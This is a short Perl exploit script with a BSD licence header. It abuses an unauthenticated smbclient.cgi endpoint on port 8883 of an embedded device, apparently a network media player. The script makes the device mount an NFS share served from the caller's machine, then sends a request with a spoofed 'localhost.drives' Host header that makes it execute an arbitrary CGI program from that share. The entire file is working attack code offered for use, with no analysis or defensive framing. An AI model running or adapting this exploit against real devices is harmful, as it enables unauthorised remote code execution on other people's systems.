#! /usr/bin/perl

# Copyright (c) 2015 Mans Rullgard <mans@mansr.com>
# All rights reserved.

# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:

# 1. Redistributions of source code must retain the above copyright notice,
#    this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.

# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

use strict;
use warnings;

use Socket qw/:all/;
use Cwd qw/realpath/;
use File::Basename;

my $target   = $ARGV[0] || die;
my $cgi      = $ARGV[1] || die;
my $nfs_name = $ARGV[2] || 'boot';
my $nfs_root = $ARGV[3] || dirname(realpath($cgi));

my $http_port = 8883;

socket S, AF_INET, SOCK_DGRAM, 0;
connect S, sockaddr_in(80, scalar gethostbyname $target);
my $host_ip = inet_ntoa((sockaddr_in(getsockname S))[1]) or
    die "Unable to determine host IP\n";
close S;

sub send_http {
    my ($dest, $port, $req, %headers) = @_;

    socket H, AF_INET, SOCK_STREAM, 0 or die "socket: $!\n";
    connect H, sockaddr_in($port, scalar gethostbyname $dest) or
        die "connect: $!\n";
    syswrite H, "GET $req HTTP/1.1\r\n";
    syswrite H, "$_: $headers{$_}\r\n" for (keys %headers);
    syswrite H, "\r\n";
    while (defined(my $line = <H>)) {
        last if $line =~ /^[\r\n]*$/;
    }
    close H;
}

my $smb_args = join '&',
    "smb.cmd=mount",
    "smb.opt=nfs://$host_ip:$nfs_root",
    "smb.name=$nfs_name";
my $smb_req = "/smbclient.cgi?$smb_args";
my $cgi_req = "/NETWORK_SHARE/$nfs_name/$cgi";

send_http $target, $http_port, $smb_req;
send_http $target, $http_port, $cgi_req, Host => 'localhost.drives';
